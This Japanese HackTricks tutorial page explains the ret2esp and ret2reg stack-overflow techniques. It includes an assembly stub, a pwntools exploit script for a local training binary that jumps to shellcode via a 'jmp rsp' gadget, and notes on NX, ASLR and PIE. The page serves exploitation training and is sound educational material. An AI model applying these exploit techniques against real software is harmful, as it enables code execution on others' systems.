# Ret2esp / Ret2reg

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する。
- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **Rest2esp**

**ESP（スタックポインタ）は常にスタックの先頭を指すため**、このテクニックはEIP（命令ポインタ）を**`jmp esp`**または**`call esp`**命令のアドレスで置き換えることを含みます。これにより、シェルコードが上書きされたEIPの直後に配置されます。`ret`命令が実行されると、ESPは次のアドレスを指し、つまりシェルコードが格納されている場所を指します。

WindowsまたはLinuxで**アドレス空間配置のランダム化（ASLR）**が有効でない場合、共有ライブラリで見つかる`jmp esp`または`call esp`命令を使用することが可能です。ただし、[**ASLR**](../common-binary-protections-and-bypasses/aslr/)が有効な場合、これらの命令を脆弱なプログラム内で探す必要があります（かつ[**PIE**](../common-binary-protections-and-bypasses/pie/)を打破する必要があるかもしれません）。

さらに、シェルコードを**EIPの破損後に配置できる**ことは、スタックの中央ではなく、関数のスタックの中に配置された場合に発生する可能性のある関数の操作中に実行される`push`または`pop`命令がシェルコードに干渉しないことを保証します。

### スペースが不足している場合

RIPを上書きした後に書き込むスペースが不足している場合（おそらく数バイトしかない場合）、最初の`jmp`シェルコードを書き込んでください。
```armasm
sub rsp, 0x30
jmp rsp
```
### 早めにスタックにシェルコードを書く。

### 例

このテクニックの例は、[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) にあり、最終的なエクスプロイトは次のようになります：
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

同様に、シェルコードが格納されているアドレスを返す関数がわかっている場合、**`call eax`**または**`jmp eax`**命令（**ret2eax**テクニックとして知られる）を活用することができ、シェルコードを実行する別の方法が提供されます。eaxと同様に、興味深いアドレスを含む**他のレジスタ**を使用することもできます（**ret2reg**）。

### 例

ここに例があります：[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## 保護

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): スタックが実行不可であれば、スタックにシェルコードを配置して実行する必要があるため、これは役立ちません。
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): これらは、espや他のレジスタにジャンプする命令を見つけるのを難しくする可能性があります。

## 参考文献

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見る
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
